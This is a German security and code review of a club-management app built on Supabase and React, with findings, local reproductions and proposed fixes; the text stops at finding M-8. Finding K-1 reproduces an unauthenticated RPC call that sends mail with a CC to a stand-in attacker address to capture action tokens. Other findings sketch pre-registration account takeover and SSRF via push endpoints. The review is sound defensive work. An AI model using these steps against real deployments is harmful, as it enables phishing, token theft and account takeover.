# Code-Review der gesamten Codebasis

**Stand:** 23.09.2026, Commit `f065188`
**Umfang:** Supabase-Migrationen und RLS, Edge Functions, Frontend (React/PWA),
GitHub-Workflows, Skripte, Abhängigkeiten.

## Vorgehen

- Quelltext gelesen, Schwerpunkt auf allem, was Rechte, personenbezogene Daten und
  Versand betrifft.
- Die Datenbank lokal aufgebaut (`scripts/local-db.sh reset`, 33 Migrationen + Seed) und
  die Befunde dort **nachgestellt** – als `anon` (nicht angemeldet) und als normales
  Mitglied. Die Kompatibilitätsschicht `scripts/supabase-compat.sql` bildet die
  Standardrechte von Supabase nach (`ALTER DEFAULT PRIVILEGES … TO anon, authenticated`),
  die Ergebnisse übertragen sich deshalb auf das echte Projekt.
- Ist-Zustand der Prüfungen: `tsc --noEmit` grün, 950 Vitest-Tests grün, 403
  pgTAP-Assertions grün, `npm audit`: 2 × moderat (siehe V-6). `npm run lint` läuft nicht
  (siehe V-1).

Befunde mit **Nachweis** wurden lokal ausgeführt; Befunde mit **Einschätzung** folgen aus
dem Code, ließen sich ohne echtes Supabase-Projekt aber nicht vorführen.

## Übersicht

| ID | Befund | Schwere | Aufwand |
|---|---|---|---|
| [K-1](#k-1) | Interne `SECURITY DEFINER`-Funktionen sind ohne Anmeldung aufrufbar – u. a. E-Mail-Versand mit beliebigem Link und CC | **kritisch** | klein |
| [K-2](#k-2) | Vorab-Übernahme von Konten über die Registrierung (Pre-Account-Takeover) | **kritisch** | klein |
| [H-1](#h-1) | E-Mail, Telefon, Geburtstag aller Mitglieder direkt aus `profiles` lesbar – Sichtbarkeitsschalter wirkungslos | hoch | mittel |
| [H-2](#h-2) | Privater Abwesenheitsgrund für Admin, Mannschaftsführer und Trainer lesbar | hoch | klein |
| [H-3](#h-3) | Cron-Aufrufe der Edge Functions scheitern nach Code-Lage an der Anmeldung | hoch | klein |
| [H-4](#h-4) | Stilles Abschneiden bei 1000 Zeilen: Sammelerinnerung, Statistik, Ersatzsuche | hoch | mittel |
| [M-1](#m-1) | Doppelversand bei überlappenden Läufen (Postfach, Trainings-/Terminerinnerungen) | mittel | mittel |
| [M-2](#m-2) | Registrierungscode ohne Begrenzung durchprobierbar | mittel | klein |
| [M-3](#m-3) | Push-Endpunkte und Kopie-Adressen ungeprüft (SSRF, Spam) | mittel | klein |
| [M-4](#m-4) | Endgültige Löschung lässt den Auth-Benutzer stehen | mittel | klein |
| [M-5](#m-5) | Service Worker öffnet beliebige Adressen aus Push-Nachrichten | mittel | klein |
| [M-6](#m-6) | Kapazitätsgrenzen und Einmal-Token ohne Sperre (Überbuchung, Doppelnutzung) | mittel | klein |
| [M-7](#m-7) | Datenbanksicherung liegt unverschlüsselt als GitHub-Artefakt | mittel | klein |
| [M-8](#m-8) | Ungepinnte Abhängigkeiten in Edge Functions und Workflows | mittel | klein |
| [N-1](#n-1) | „Heute" wird an mehreren Stellen in UTC bestimmt | niedrig | klein |
| [N-2](#n-2) | Mitglied kann eigene Verwaltungsspalten ändern (`email`, `auth_linked_at` …) | niedrig | klein |
| [N-3](#n-3) | Mannschaftsführer darf jede Spalte eines Spiels ändern | niedrig | mittel |
| [N-4](#n-4) | Nachrichten lassen sich an unsichtbare Objekte umhängen | niedrig | klein |
| [N-5](#n-5) | Kalender-Abo mit `Cache-Control: public` | niedrig | klein |
| [N-6](#n-6) | Kalenderabgleich ohne Zeitlimit, Größenlimit und Zieladressprüfung | niedrig | klein |
| [N-7](#n-7) | Antwortseite: Auto-Speichern per `?a=` und falsche Überschrift | niedrig | klein |
| [N-8](#n-8) | Keine Content-Security-Policy | niedrig | klein |
| [N-9](#n-9) | Kleinere Logikfehler (Umfrage, „letzter Login", Profil fehlt) | niedrig | klein |
| [V-1](#v-1) … [V-9](#v-9) | Verbesserungen: Lint, Duplikate, Fehlerbehandlung, Tests, Betrieb | – | – |

**Reihenfolge der Behebung:** K-1 und K-2 vor jeder Einladung (beide sind mit wenigen
Zeilen SQL erledigt), danach H-1 bis H-4. K-1 gehört als pgTAP-Test abgesichert, damit
jede künftige Funktion automatisch mitgeprüft wird (V-4).

---

## Kritisch

<a id="k-1"></a>

### K-1 · Interne `SECURITY DEFINER`-Funktionen sind ohne Anmeldung aufrufbar

**Fundstelle:** alle Migrationen, Muster `REVOKE ALL ON FUNCTION … FROM PUBLIC;`
(z. B. `supabase/migrations/20261006000000_notifications.sql:350`,
`20261010000000_reminder_tracking.sql:83`, `20261015000000_events.sql:211`)

**Problem.** Supabase vergibt für jede neue Funktion im Schema `public` per
`ALTER DEFAULT PRIVILEGES` **ausdrücklich** `EXECUTE` an `anon` und `authenticated`.
`REVOKE … FROM PUBLIC` entzieht nur das Recht der Pseudo-Rolle `PUBLIC` – die beiden
ausdrücklichen Rechte bleiben stehen. In keiner Migration steht ein
`REVOKE … FROM anon, authenticated`. Damit ist **jede** Funktion in `public` über
`POST /rest/v1/rpc/<name>` mit dem öffentlichen Anon-Key aufrufbar, auch die, die nur
für `service_role` gedacht sind.

**Nachweis** (lokal, als `anon`, ohne JWT):

```text
enqueue_notification(<profil>, 'welcome', '{"cc":["x@evil.test"]}', true, now())
  → 2 Zeilen im Postfach: email + push, payload.cc = ["x@evil.test"]
run_retention()                  → läuft durch
apply_event_answer(<termin>, <profil>, 'yes', 0, 'link')   → wird ausgeführt (Seed-Termin lag
                                   in der Vergangenheit → 'gone'; bei künftigem Termin
                                   wird die Antwort im Namen des Profils gespeichert)
enqueue_substitute_request(…)    → wird ausgeführt
```

Betroffen sind 83 `SECURITY DEFINER`-Funktionen, darunter:

| Funktion | Was ein Angreifer damit kann |
|---|---|
| `enqueue_notification` | E-Mails und Push an **jedes** Mitglied, verschickt über Resend mit der Vereinsadresse. Über `payload.link` ein beliebiger (Phishing-)Link, über `payload.cc` beliebige Kopie-Empfänger, über `payload.action`/`target_id` ein **Aktions-Token**, das per CC beim Angreifer landet → Antworten im Namen des Mitglieds. Dazu Resend-Kontingent und Absender-Reputation. |
| `apply_event_answer`, `apply_substitute_answer`, `apply_reschedule_vote` | Zusagen, Ersatzantworten und Verlegungsstimmen für **beliebige** `p_profile_id` setzen |
| `enqueue_substitute_request`, `notify_chain_exhausted`, `notify_training_cancelled`, `notify_reschedule_confirmed`, `enqueue_*_reminder` | Anfragen und Benachrichtigungen in Serie auslösen |
| `kick_substitute_engine`, `kick_session_generation` | Edge-Function-Läufe per `pg_net` in beliebiger Frequenz anstoßen (Last, Kosten) |
| `match_payload`, `event_payload`, `training_payload`, `training_audience` | Termin- und Teilnehmerdaten lesen, an RLS vorbei |
| `recompute_lineup`, `run_retention` | Zustand verändern |

Voraussetzung ist nur eine Profil-UUID. Die kennt jedes (auch jedes ehemalige) Mitglied
für alle anderen, weil sie in jeder Liste mitkommt.

**Behebung.** Eine neue Migration, lokal gegen alle 33 Migrationen getestet – danach sind
für `anon` nur noch die vier öffentlichen Funktionen ausführbar, und **alle 403
pgTAP-Assertions bleiben grün**:

```sql
-- supabase/migrations/20261030000000_function_privileges.sql
--
-- Supabase gibt anon und authenticated per Default-Privileg EXECUTE auf jede neue
-- Funktion. REVOKE … FROM PUBLIC nimmt das NICHT zurück. Deshalb hier: allen alles
-- entziehen und nur gezielt wieder freigeben.

-- 1. Künftige Funktionen: kein automatisches EXECUTE mehr.
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC, anon, authenticated;

-- 2. Bestehende Funktionen.
DO $$
DECLARE
    f RECORD;
    -- Ohne Anmeldung aufrufbar
    v_anon TEXT[] := ARRAY[
        'get_public_club_info', 'rpc_validate_registration_code',
        'rpc_answer_action_token', 'rpc_describe_action_token'
    ];
    -- Für Angemeldete: alle rpc_* plus die Prädikate, die RLS-Policies und
    -- security_invoker-Views mit den Rechten des Aufrufers auswerten.
    v_authenticated TEXT[] := ARRAY[
        'current_member_role', 'is_active_member', 'is_admin', 'is_organizer_or_admin',
        'is_playing_member', 'can_see_absences', 'leads_team', 'leads_match',
        'trains', 'trains_session', 'can_see_training', 'may_see_training_roster',
        'may_see_session_roster', 'may_join_training', 'is_poll_target',
        'may_see_poll_results', 'may_hand_over_key', 'can_see_message_object',
        'may_see_training_statistics'
    ];
BEGIN
    FOR f IN
        SELECT p.oid::regprocedure AS sig, p.proname
          FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
         WHERE n.nspname = 'public'
           AND p.prokind = 'f'
           AND NOT EXISTS (SELECT 1 FROM pg_depend d          -- Extensions auslassen
                            WHERE d.objid = p.oid AND d.deptype = 'e')
    LOOP
        EXECUTE format('REVOKE EXECUTE ON FUNCTION %s FROM PUBLIC, anon, authenticated', f.sig);
        EXECUTE format('GRANT EXECUTE ON FUNCTION %s TO service_role', f.sig);

        IF f.proname = ANY (v_anon) THEN
            EXECUTE format('GRANT EXECUTE ON FUNCTION %s TO anon, authenticated', f.sig);
        ELSIF f.proname = ANY (v_authenticated) OR f.proname LIKE 'rpc\_%' THEN
            EXECUTE format('GRANT EXECUTE ON FUNCTION %s TO authenticated', f.sig);
        END IF;
    END LOOP;
END $$;
```

Trigger-Funktionen brauchen kein `EXECUTE` für den auslösenden Benutzer (geprüft wird nur
bei `CREATE TRIGGER`), sie sind deshalb bewusst nicht in den Listen.

Ergänzend:

1. **pgTAP-Test** `supabase/tests/005_function_privileges.test.sql`, der für jede
   Funktion in `public` prüft, dass `anon` nur die vier Namen oben ausführen darf und
   `authenticated` nur `rpc_*` plus die Prädikate. So fällt jede neue Funktion ohne
   passende Rechte in der CI auf:

   ```sql
   SELECT is_empty(
     $$ SELECT p.oid::regprocedure::text
          FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
         WHERE n.nspname = 'public' AND p.prokind = 'f'
           AND has_function_privilege('anon', p.oid, 'EXECUTE')
           AND p.proname NOT IN ('get_public_club_info', 'rpc_validate_registration_code',
                                 'rpc_answer_action_token', 'rpc_describe_action_token')
           AND NOT EXISTS (SELECT 1 FROM pg_depend d WHERE d.objid = p.oid AND d.deptype = 'e') $$,
     'anon darf nur die öffentlichen Funktionen ausführen'
   );
   ```

2. **Mittelfristig:** interne Helfer (`enqueue_*`, `apply_*`, `notify_*`, `kick_*`,
   `*_payload`, `training_audience`, `recompute_lineup`, `run_retention`) in ein Schema
   verschieben, das PostgREST nicht veröffentlicht (z. B. `internal`). Dann ist der Fehler
   strukturell ausgeschlossen, nicht nur per Rechteliste.
3. In `enqueue_notification` die Schlüssel `cc`, `link`, `action`, `target_id`,
   `expires_at` aus `p_payload` nur von vertrauenswürdigen Aufrufern übernehmen – bzw.
   `cc` **immer** aus `profiles.emails_copies` setzen und einen mitgegebenen Wert
   verwerfen.

<a id="k-2"></a>

### K-2 · Vorab-Übernahme von Konten über die Registrierung

**Fundstelle:** `supabase/migrations/20261001000000_schema_v2.sql:370–429`
(`handle_new_user`)

**Problem.** Der Trigger läuft `AFTER INSERT ON auth.users` – also beim **Registrieren**,
nicht beim Bestätigen der E-Mail. Existiert ein noch nicht verknüpftes Profil mit
derselben Adresse (jedes vom Admin angelegte oder importierte Mitglied), wird es sofort
auf den neuen Auth-Benutzer umgehängt – **ohne** Registrierungscode und ohne Nachweis,
dass der Aufrufer die Adresse besitzt.

**Szenario (Einschätzung).**

1. Angreifer ruft `supabase.auth.signUp({ email: 'vorstand@…', password: 'geheim' })`
   direkt gegen die API auf (der Anon-Key steht im Bundle, Registrierung ist für den
   Code-Weg eingeschaltet).
2. `handle_new_user` verknüpft das Profil von „vorstand@…" – inklusive einer eventuell
   schon vergebenen Rolle `admin` – mit dem Auth-Benutzer des Angreifers.
3. - Ist *Confirm email* in Supabase **aus**: Der Angreifer ist sofort als diese Person
     angemeldet.
   - Ist sie **an**: Die spätere Einladung scheitert mit `already_registered`
     (`invite-member`, Z. 99 ff.). Fordert die echte Person daraufhin einen Magic Link an,
     bestätigt sie damit die Adresse des vom Angreifer angelegten Kontos – dessen
     Passwort der Angreifer kennt. Danach meldet er sich mit E-Mail + Passwort an.

**Behebung.** Ein vorhandenes Profil nur übernehmen, wenn die Adresse nachgewiesen ist –
über die Einladung (`invited_at`) oder eine bereits bestätigte Adresse:

```sql
-- in handle_new_user, Weg a)
IF v_existing_id IS NOT NULL THEN
    IF NEW.invited_at IS NULL AND NEW.email_confirmed_at IS NULL THEN
        RAISE EXCEPTION
            'Für diese E-Mail-Adresse gibt es bereits ein Mitgliedsprofil. Bitte beim Administrator eine Einladung anfordern.'
            USING ERRCODE = 'insufficient_privilege';
    END IF;
    -- … wie bisher verknüpfen
```

Dazu:

- In Supabase *Authentication → Providers → Email*: **Confirm email** und **Secure email
  change** einschalten und in `docs/einrichtung.md` als Pflicht festhalten.
- pgTAP-Test in `020_registration.test.sql`: `INSERT INTO auth.users` mit vorhandener
  Adresse, ohne `invited_at` → Exception; mit `invited_at` → Verknüpfung. (Die
  Kompatibilitätsschicht braucht dafür die Spalten `invited_at` und `email_confirmed_at`
  in `auth.users`.)
- Weg b) (Selbstregistrierung) legt das Profil ebenfalls vor der Bestätigung an. Das ist
  weniger kritisch (Status `pending_approval`), erlaubt aber, fremde Adressen zu
  „besetzen". Sauberer: Profil erst in einem `AFTER UPDATE OF email_confirmed_at`-Trigger
  anlegen.

---

## Hoch

<a id="h-1"></a>

### H-1 · Kontaktdaten aller Mitglieder direkt aus `profiles` lesbar

**Fundstelle:** `20261001000000_schema_v2.sql:488–510` (View), `:523–526` (GRANT),
`20261003000000_member_admin.sql:30` (Policy `profiles_select`);
`src/features/members/api.ts:35` (`useMembers`)

**Problem.** Die Sichtbarkeit von E-Mail, Telefon und Geburtstag (`contact_visible`,
`hide_birthday`) setzt nur die View `v_members_directory` um. Die Tabelle `profiles`
selbst ist per `GRANT SELECT` vollständig freigegeben, und die Policy lässt jedes aktive
Mitglied **alle Zeilen** sehen. Wer die View umgeht, bekommt alles – inklusive
`emails_copies` (Eltern-Adressen) und `member_number`.

Das Frontend tut das sogar selbst: `useMembers()` lädt `profiles.select('*')` und wird
in Seiten für **alle** Mitglieder verwendet (`ClubTeamsTab`, `ClubGamesTab`,
`ClubRolesTab`, `TeamsPage`, `PlayersManagementPage`). Jeder Browser hält damit die
Kontaktdaten des ganzen Vereins im Speicher, sichtbar in den Entwicklerwerkzeugen.

**Nachweis** (angemeldet als normales Mitglied):

```text
SELECT full_name, email, phone, birthday FROM profiles WHERE contact_visible = false;
  → 29 Zeilen mit E-Mail-Adresse
SELECT … FROM v_members_directory …  → email/birthday leer (View wirkt, Tabelle nicht)
```

Datenschutzrechtlich (Art. 5 Abs. 1 lit. f, Art. 25 DSGVO) ist das ein Fehler, weil der
Datenschutzhinweis die Freigabe als Schutz beschreibt.

**Behebung.**

1. Spaltenrechte statt Tabellenrecht:

   ```sql
   REVOKE SELECT ON public.profiles FROM authenticated;
   GRANT SELECT (id, first_name, last_name, full_name, role, status, gender, no_games,
                 qttr, contact_visible, hide_birthday, deleted_at, auth_linked_at,
                 created_at, updated_at)
       ON public.profiles TO authenticated;
   ```

2. Die volle eigene Zeile und die Verwaltungsansicht über definierte Wege:
   - `v_my_profile` bzw. `rpc_my_profile()` (`SECURITY DEFINER`, `WHERE id = auth.uid()`)
     für `fetchProfile` in `src/features/auth/api.ts:295`;
   - `v_members_admin` ohne `security_invoker`, mit `WHERE public.is_admin()`, für die
     Mitgliederverwaltung.
3. `v_members_directory` braucht danach die Rechte des Eigentümers: `security_invoker`
   entfernen, `security_barrier = true` setzen und die Zeilenregel der Policy
   (`is_active_member()`, Gast-Einschränkung) in das `WHERE` übernehmen.
4. Frontend: `useMembers()` für Nicht-Admins auf `v_members_directory` bzw. eine
   explizite Spaltenliste umstellen; `select('*')` auf `profiles` gibt es danach nur noch
   in der Admin-Ansicht.
5. pgTAP: als Mitglied `SELECT email FROM profiles WHERE id <> auth.uid()` →
   `permission denied`.

Dasselbe gilt für Schreibrechte: Statt der Positivliste im Trigger
`protect_profile_columns` (siehe N-2) besser `GRANT UPDATE (first_name, last_name, phone,
…) ON profiles TO authenticated`.

<a id="h-2"></a>

### H-2 · Privater Abwesenheitsgrund für Verantwortliche lesbar

**Fundstelle:** `20261002000000_absences.sql:53–89`

**Problem.** Gleiches Muster wie H-1: `comment_private` („nur für dich sichtbar") wird in
`v_absences` ausgeblendet, die Tabelle `absences` ist aber für Admin, Mannschaftsführer
und Trainer (`can_see_absences()`) mit allen Spalten lesbar.

**Behebung.** Den Grund in eine eigene Tabelle auslagern, die nur die Person selbst sieht:

```sql
CREATE TABLE public.absence_comments (
    absence_id UUID PRIMARY KEY REFERENCES public.absences(id) ON DELETE CASCADE,
    profile_id UUID NOT NULL REFERENCES public.profiles(id) ON UPDATE CASCADE ON DELETE CASCADE,
    comment    TEXT NOT NULL
);
ALTER TABLE public.absence_comments ENABLE ROW LEVEL SECURITY;
CREATE POLICY absence_comments_own ON public.absence_comments
    FOR ALL TO authenticated
    USING (profile_id = auth.uid()) WITH CHECK (profile_id = auth.uid());
```

Daten übernehmen, `absences.comment_private` entfernen, `v_absences` per `LEFT JOIN`
anpassen. Alternativ Spaltenrechte wie in H-1 und `v_absences` ohne `security_invoker`.

<a id="h-3"></a>

### H-3 · Cron-Aufrufe der Edge Functions scheitern nach Code-Lage

**Fundstelle:** `authorize()` in allen fünf Cron-Functions (z. B.
`supabase/functions/process-notifications/index.ts:144–161`),
`20261007000000_cron_notifications.sql:32–39`, fehlende `supabase/config.toml`

**Problem.** Zwei unabhängige Gründe, jeder für sich ausreichend:

1. **Gateway:** Edge Functions verlangen standardmäßig ein gültiges JWT
   (`verify_jwt = true`). Die `private.trigger_*`-Funktionen schicken per `pg_net` nur
   `x-cron-secret`, keinen `Authorization`-Header. Eine `supabase/config.toml` mit
   `verify_jwt = false` gibt es im Repository nicht, und der Workflow
   `deploy-supabase.yml` ruft `supabase functions deploy` ohne `--no-verify-jwt` auf –
   jede Einstellung im Dashboard wird beim nächsten Ausrollen zurückgesetzt
   (so beschrieben in `docs/einrichtung.md:170 ff.` für `calendar-feed`).
2. **Secret-Abgleich:** Die Functions lesen das Secret per
   `admin.schema('private').from('cron_config')`. PostgREST veröffentlicht `private`
   nicht (so gewollt, `docs/einrichtung.md:199`), und `service_role` hat kein `USAGE` auf
   dem Schema (lokal geprüft: `has_schema_privilege('service_role','private','USAGE') =
   false`). Die Abfrage liefert einen Fehler, `expected` ist leer, `authorize()` gibt
   `false` zurück → 401.

Folge: Keine automatischen E-Mails, keine Erinnerungen, keine Ersatzkette, kein
nächtlicher Kalenderabgleich, keine neuen Trainingstermine – die Oberfläche funktioniert
trotzdem, der Ausfall fällt also erst spät auf.

**Prüfen** (SQL-Editor im Projekt):

```sql
SELECT id, status_code, left(content::text, 120), created
  FROM net._http_response ORDER BY created DESC LIMIT 20;
```

Stehen dort 401, ist der Befund bestätigt.

**Behebung.**

1. `supabase/config.toml` ins Repository:

   ```toml
   [functions.calendar-feed]
   verify_jwt = false

   [functions.process-notifications]
   verify_jwt = false
   [functions.enqueue-reminders]
   verify_jwt = false
   [functions.substitute-engine]
   verify_jwt = false
   [functions.sync-calendars]
   verify_jwt = false
   [functions.generate-training-sessions]
   verify_jwt = false
   ```

   Die Functions prüfen den Aufrufer ohnehin selbst (Cron-Secret oder Benutzer-JWT über
   `auth.getUser()`).

2. Das Secret nicht über PostgREST lesen. Am einfachsten zusätzlich als Function-Secret:
   `supabase secrets set CRON_SECRET=<derselbe Wert>` und im Code

   ```ts
   const expected = Deno.env.get('CRON_SECRET');
   return Boolean(expected) && timingSafeEqual(cronSecret, expected);
   ```

   Alternativ eine Funktion `public.verify_cron_secret(p TEXT) RETURNS BOOLEAN`
   (`SECURITY DEFINER`, `EXECUTE` nur für `service_role`).
3. Die Prüfung in `_shared/auth.ts` zusammenführen (siehe V-2), damit sie nicht fünfmal
   gepflegt werden muss.

<a id="h-4"></a>

### H-4 · Stilles Abschneiden bei 1000 Zeilen

**Fundstelle:** `supabase/functions/enqueue-reminders/index.ts:427–430`,
`src/features/statistics/api.ts:19–23`, `supabase/functions/substitute-engine/index.ts:180`

**Problem.** PostgREST liefert in Supabase standardmäßig höchstens **1000 Zeilen** pro
Anfrage (*API → Max rows*), ohne Fehler. Drei Stellen laden unbegrenzt wachsende Mengen:

| Stelle | Größe bei einem mittleren Verein | Folge |
|---|---|---|
| `v_open_participations` (`select('*')`, ohne Datumsfilter, ohne Sortierung) | offene Spiele der Saison × Spieler + 8 Wochen Training × Teilnehmer + Termine × **alle** Mitglieder – schnell > 1000 | Ein zufälliger Teil der Mitglieder bekommt keine Sammelerinnerung |
| `v_training_statistics` (Zeile je Person × vergangenem Termin, `order('session_date')`) | 20 Personen × 2 Termine/Woche × 1 Jahr ≈ 2000 | **Die neuesten** Termine fehlen in der Statistik |
| `absences` in der Ersatzkette (alle Abwesenheiten aller Zeiten) | wächst mit jedem Jahr | Wer abwesend ist, wird trotzdem als Ersatz angefragt |

**Behebung.**

- Sammelerinnerung: auf den Zeitraum filtern
  (`.lte('starts_at', now + withinDays)`), und besser noch in einer Datenbankfunktion
  **je Person aggregieren**, damit die Zeilenzahl der Mitgliederzahl entspricht.
- Statistik: in der Datenbank verdichten (`GROUP BY training_id, profile_id` mit
  `count(*) FILTER (WHERE status = …)`) statt Rohzeilen zu laden.
- Ersatzkette: `.gte('end_date', heute).in('profile_id', kandidaten)`.
- Allgemein: Jede Abfrage ohne natürliche Obergrenze entweder paginieren (`.range()`)
  oder serverseitig verdichten. Eine Hilfsfunktion `fetchAll(query)` in `src/lib` und
  `_shared/` macht das einheitlich.

---

## Mittel

<a id="m-1"></a>

### M-1 · Doppelversand bei überlappenden Läufen

**Fundstelle:** `process-notifications/index.ts:84–139`,
`enqueue-reminders/index.ts:334–340` und `:400–406`

**Problem.**

1. `process-notifications` liest bis zu 50 `pending`-Zeilen und schreibt den Status erst
   **nach** dem Versand zurück. Laufen zwei Läufe gleichzeitig, verschicken beide
   dieselben Nachrichten. Das passiert, sobald ein Lauf länger als das 5-Minuten-Raster
   dauert – und dafür genügt eine hängende Verbindung: Der `fetch` zu Resend
   (`process-notifications/index.ts:249`) hat kein Zeitlimit. Ebenso bei einem manuellen
   Aufruf (curl, Admin-JWT) parallel zum Cron.
2. In `enqueue-reminders` soll `update({ reminder_sent_at }).is('reminder_sent_at', null)`
   den Termin „beanspruchen". Trifft das Update **keine** Zeile, weil ein paralleler Lauf
   schneller war, liefert supabase-js trotzdem `error = null` – die Erinnerungen werden
   ein zweites Mal eingereiht.

**Behebung.**

0. Dem Resend-Aufruf ein Zeitlimit geben: `signal: AbortSignal.timeout(10_000)`.
1. Zeilen atomar beanspruchen, per Datenbankfunktion:

   ```sql
   CREATE FUNCTION public.claim_notifications(p_limit INT)
   RETURNS SETOF public.notifications
   LANGUAGE sql SECURITY DEFINER SET search_path = public, pg_temp AS $$
       UPDATE public.notifications n
          SET status = 'sending', attempts = n.attempts
        WHERE n.id IN (
              SELECT id FROM public.notifications
               WHERE status = 'pending' AND scheduled_for <= NOW()
               ORDER BY scheduled_for
               LIMIT p_limit
               FOR UPDATE SKIP LOCKED)
       RETURNING n.*;
   $$;
   ```

   (Status `sending` im Enum bzw. CHECK ergänzen; hängengebliebene `sending`-Zeilen
   nach z. B. 30 Minuten zurück auf `pending`.)
2. In `enqueue-reminders` die betroffenen Zeilen zurückgeben lassen und prüfen:

   ```ts
   const { data: claimed } = await admin
     .from('training_sessions')
     .update({ reminder_sent_at: now.toISOString() })
     .eq('id', action.sessionId)
     .is('reminder_sent_at', null)
     .select('id');
   if (!claimed || claimed.length === 0) continue;
   ```

<a id="m-2"></a>

### M-2 · Registrierungscode ohne Begrenzung durchprobierbar

**Fundstelle:** `20261001000000_schema_v2.sql:453–468`, `src/features/auth/api.ts:267`

**Problem.** `rpc_validate_registration_code` ist für `anon` freigegeben und hat keine
Begrenzung der Versuche; der Code ist ein frei gewählter Text. Ein kurzer oder erratbarer
Code („TTC2026") ist schnell gefunden. Wer ihn hat, kann beliebig viele
`pending_approval`-Konten anlegen (Admin-Postfach füllt sich, Adressen werden besetzt).

**Behebung.**

- Den Code in der Oberfläche **erzeugen** statt eintippen lassen, z. B. 20 Zeichen
  Base32 (`encode(gen_random_bytes(16), 'base64')` bereinigt) – dann ist Raten
  aussichtslos.
- In Supabase *Auth → Attack Protection* Captcha (hCaptcha/Turnstile) für `signUp`
  einschalten.
- Optional: Codeprüfung in eine Edge Function mit Rate-Limit je IP verschieben.

<a id="m-3"></a>

### M-3 · Push-Endpunkte und Kopie-Adressen ungeprüft

**Fundstelle:** Policy `push_subscriptions_own`, `profiles.emails_copies`,
`process-notifications/index.ts:246` und `:359–368`

**Problem.**

- Jedes Mitglied kann in `push_subscriptions` einen **beliebigen** `endpoint` eintragen.
  Der Versandlauf schickt an diese Adresse einen POST (web-push) – ein Request aus der
  Supabase-Infrastruktur an ein frei gewähltes Ziel (SSRF, wenn auch ohne Rückkanal).
- `emails_copies` ist ein unbegrenztes `TEXT[]` ohne Formatprüfung und für das Mitglied
  selbst schreibbar. Jede Benachrichtigung geht als CC an alle Einträge – mit 500
  Adressen wird der Vereinsversand zur Spamschleuder.

**Behebung.**

```sql
ALTER TABLE public.push_subscriptions ADD CONSTRAINT push_endpoint_known CHECK (
    endpoint ~ '^https://(fcm\.googleapis\.com|updates\.push\.services\.mozilla\.com|[a-z0-9.-]+\.notify\.windows\.com|web\.push\.apple\.com)/'
);

ALTER TABLE public.profiles ADD CONSTRAINT profiles_emails_copies_check CHECK (
    cardinality(emails_copies) <= 3
);
-- Formatprüfung je Eintrag über eine IMMUTABLE-Hilfsfunktion oder einen Trigger.
```

<a id="m-4"></a>

### M-4 · Endgültige Löschung lässt den Auth-Benutzer stehen

**Fundstelle:** `20261027000000_retention.sql:67–77`, `src/features/auth/guards.tsx:24–51`

**Problem.** `run_retention()` löscht die Zeile in `profiles`, aber nicht den Benutzer in
`auth.users` (es gibt bewusst keinen Fremdschlüssel). E-Mail-Adresse, Passwort-Hash und
Anmeldeprotokolle bleiben unbegrenzt stehen – das widerspricht dem Löschkonzept. Die
Person kann sich weiter anmelden; `RequireAuth` lässt `profile === null` durch, sie sieht
eine leere Anwendung.

**Behebung.**

- In `run_retention()` die gelöschten IDs auch aus `auth.users` entfernen (die Funktion
  läuft als Eigentümer `postgres`, der das in Supabase darf):

  ```sql
  WITH gone AS (DELETE FROM public.profiles WHERE … RETURNING id)
  DELETE FROM auth.users WHERE id IN (SELECT id FROM gone);
  ```

  Alternativ über `auth.admin.deleteUser()` aus einer Edge Function.
- In `RequireAuth`: Sitzung ohne Profil → Hinweis „Kein Mitgliedsprofil" und Abmelden,
  statt die App anzuzeigen.
- Beim Soft-Delete (`rpc_delete_my_account`, Löschen durch Admin) laufende Sitzungen
  beenden (`auth.admin.signOut(userId, 'global')` in einer Edge Function) – sonst bleibt
  das Refresh-Token bis zu seinem Ablauf nutzbar.

<a id="m-5"></a>

### M-5 · Service Worker öffnet beliebige Adressen aus Push-Nachrichten

**Fundstelle:** `src/sw.ts:106–125`, `supabase/functions/_shared/pushMessage.ts:111`

**Problem.** `notificationclick` navigiert ungeprüft zu `data.url`, und die stammt aus
`payload.link`. Zusammen mit K-1 heißt das: eine echte Push-Nachricht der Vereins-App, die
beim Antippen eine fremde Seite öffnet. Auch nach Behebung von K-1 ist die Prüfung als
zweite Linie sinnvoll.

**Behebung.**

```ts
const raw = (event.notification.data as { url?: string } | null)?.url || '/';
let target = '/';
try {
  const url = new URL(raw, self.location.origin);
  if (url.origin === self.location.origin) target = url.pathname + url.search + url.hash;
} catch {
  /* ungültige Adresse → Startseite */
}
```

<a id="m-6"></a>

### M-6 · Kapazitätsgrenzen und Einmal-Token ohne Sperre

**Fundstelle:** `rpc_set_training_attendance` (`20261014000000_trainings.sql`,
Teilnehmergrenze), `rpc_set_event_participation`, `rpc_answer_action_token`

**Problem.** Die Teilnehmergrenze wird per `SELECT SUM(…)` geprüft und danach
eingefügt – zwei gleichzeitige Zusagen für den letzten Platz kommen beide durch. Ebenso
prüft `rpc_answer_action_token` `used_at IS NULL` ohne Zeilensperre; zwei gleichzeitige
Aufrufe verbrauchen den Token beide (kleine Wirkung, aber gegen die eigene Zusage
„einmal benutzbar").

**Behebung.** Vor der Prüfung die Elternzeile sperren:

```sql
SELECT * INTO v_session FROM public.training_sessions WHERE id = p_session_id FOR UPDATE;
-- bzw.
SELECT * INTO v_token FROM public.action_tokens WHERE token = p_token FOR UPDATE;
```

Das serialisiert nur Anfragen zum selben Termin bzw. Token.

<a id="m-7"></a>

### M-7 · Datenbanksicherung unverschlüsselt als GitHub-Artefakt

**Fundstelle:** `.github/workflows/backup.yml`

**Problem.** Der Dump mit allen Mitgliederdaten liegt 90 Tage als Artefakt. Jede Person
mit Lesezugriff auf das Repository kann ihn herunterladen; wird das Repository versehentlich
öffentlich oder ein Token eines Mitwirkenden kompromittiert, sind alle Daten weg.

**Behebung.** Vor dem Hochladen mit einem öffentlichen Schlüssel verschlüsseln; der
private Schlüssel liegt nur beim Vorstand, nicht in GitHub:

```yaml
- name: Verschlüsseln
  env:
    BACKUP_PUBLIC_KEY: ${{ vars.BACKUP_AGE_RECIPIENT }}   # age1…
  run: |
    sudo apt-get install -y age
    for f in *.dump; do age -r "$BACKUP_PUBLIC_KEY" -o "$f.age" "$f" && rm "$f"; done
```

`path: '*.dump.age'`. Wiederherstellung in `docs/betrieb.md` beschreiben.

<a id="m-8"></a>

### M-8 · Ungepinnte Abhängigkeiten in Edge Functions und Workflows

**Fundstelle:** alle Edge Functions (`https://esm.sh/@supabase/supabase-js@2`),
`deploy-supabase.yml` (`supabase/setup-cli@v1` mit `version: latest`), alle Workflows
(Actions per Tag statt Commit-SHA)

